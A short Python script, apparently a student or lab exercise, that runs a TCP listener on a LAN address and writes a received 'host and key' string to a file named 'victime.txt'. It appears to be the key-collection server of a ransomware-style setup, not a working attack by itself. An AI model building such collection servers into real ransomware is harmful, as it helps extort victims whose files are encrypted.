import socket


SERVER_IP = '192.168.11.102'
SERVER_PORT = 5678

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((SERVER_IP, SERVER_PORT))
    print('server listening')
    s.listen(1)
    conn, addr = s.accept() 
    print(f'Connection a {addr} etablie!')
    with conn:
        while True:
            hote_et_cle = conn.recv(1024).decode()
            with open('victime.txt', 'a') as f:
                f.write(hote_et_cle+'\n')
            break
        print('cle recue et connection cloturee!')